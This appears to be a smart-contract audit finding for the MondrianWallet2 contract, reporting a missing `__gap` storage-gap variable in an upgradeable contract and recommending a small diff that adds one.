## Vulnerability Details

According to the covention it is useful to declare unused variables or the so-called storage gaps in base contracts that you may want to extend in the future, as a means of "reserving" those slots.

This can be done by adding the `__gap` unused variable to the beginning of teh contract, e.g. at [Line 36 of MondrianWallet2.sol](https://github.com/Cyfrin/2024-07-Mondrian-Wallet_v2/blob/2abc3e4831d27ae9c498edd3782fd61524587dc0/src/MondrianWallet2.sol#L36). The variable name `__gap` or a name starting with `__gap_` must be used for the array so that OpenZeppelin Upgrades will recognize the gap variables.

## Impact

The missing `__gap` will affect the storage layout of future child contracts. This is due to an unfollowed convention for implementation of upgradeable contracts.

## Tools Used

Manual Review

## Recommendations

Add the `__gap` variable at the beginning of the `MondrianWallet2` contract. Look at the following code.

```diff
contract MondrianWallet2 is IAccount, Initializable, OwnableUpgradeable, UUPSUpgradeable {
    using MemoryTransactionHelper for Transaction;

+   uint256[48] __gap;
+
    error MondrianWallet2__NotEnoughBalance();

    ...

}
```




    